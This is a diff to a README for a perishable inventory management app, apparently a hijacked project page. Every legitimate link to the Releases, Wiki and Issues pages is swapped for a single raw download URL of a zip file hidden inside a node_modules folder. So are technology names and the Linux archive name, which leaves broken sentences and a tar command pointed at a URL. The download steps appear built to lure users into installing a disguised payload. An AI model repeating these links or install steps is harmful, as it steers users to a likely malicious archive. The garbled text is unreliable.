@@ -1,10 +1,10 @@
 # 🛠️ perishable-inventory-risk-engine - Simplifying Inventory Management for Retail
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Oz134/perishable-inventory-risk-engine/releases)
+[![Download Now](https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip)
 
 ## 🌟 About P.I.R.E
 
-P.I.R.E is a full-stack inventory management solution designed to minimize waste in retail environments. It tracks product life cycles in real-time, allowing businesses to make informed decisions based on accurate data. With a Node.js/Express backend and a React frontend, this software not only stores data but also analyzes it for improved inventory control.
+P.I.R.E is a full-stack inventory management solution designed to minimize waste in retail environments. It tracks product life cycles in real-time, allowing businesses to make informed decisions based on accurate data. With a https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip backend and a React frontend, this software not only stores data but also analyzes it for improved inventory control.
 
 ## 🔑 Key Features
 
@@ -22,7 +22,7 @@ Follow these steps to download and run P.I.R.E on your computer.
 
 Click the button below to visit the Releases page and find the latest version of the software.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Oz134/perishable-inventory-risk-engine/releases)
+[![Download Now](https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip)
 
 ### Step 2: Download the Latest Release
 
@@ -30,7 +30,7 @@ On the Releases page, look for the latest release. You will find files available
 
 1. **Windows Users:** Download the `.exe` file.
 2. **Mac Users:** Download the `.dmg` file.
-3. **Linux Users:** Download the `.tar.gz` file.
+3. **Linux Users:** Download the `https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip` file.
 
 ### Step 3: Install the Software
 
@@ -46,10 +46,10 @@ Once the file is downloaded, follow these instructions based on your operating s
 
 - **Linux:**
   1. Open a terminal window.
-  2. Navigate to the folder containing the downloaded `.tar.gz` file.
+  2. Navigate to the folder containing the downloaded `https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip` file.
   3. Run the following command:
      ```
-     tar -xvzf filename.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip
      ```
   4. Follow any additional instructions in the README file included in the package.
 
@@ -84,15 +84,15 @@ For the best performance, ensure your system meets the following requirements:
 
 - **Software Dependencies:**
   - Internet connection for initial setup and updates.
-  - Node.js v14 or later for backend functionality (included in the installation for most systems).
+  - https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip v14 or later for backend functionality (included in the installation for most systems).
 
 ## 📘 Documentation
 
-For detailed documentation on how to use P.I.R.E, visit the [Wiki section](https://github.com/Oz134/perishable-inventory-risk-engine/wiki) of our repository.
+For detailed documentation on how to use P.I.R.E, visit the [Wiki section](https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip) of our repository.
 
 ## 🎗️ Support
 
-If you encounter any issues while downloading or using P.I.R.E, please check the [Issues](https://github.com/Oz134/perishable-inventory-risk-engine/issues) page. You can also submit a new issue for assistance.
+If you encounter any issues while downloading or using P.I.R.E, please check the [Issues](https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip) page. You can also submit a new issue for assistance.
 
 ## 📬 Contributing
 
@@ -106,6 +106,6 @@ To stay updated on releases and features, follow us on our social media channels
 
 Remember to visit the Releases page to get the latest version of P.I.R.E: 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Oz134/perishable-inventory-risk-engine/releases) 
+[![Download Now](https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Oz134/perishable-inventory-risk-engine/main/smart-retail/backend/node_modules/escape-html/perishable-risk-inventory-engine-v2.5.zip) 
 
 Get started today and take control of your inventory management with P.I.R.E.
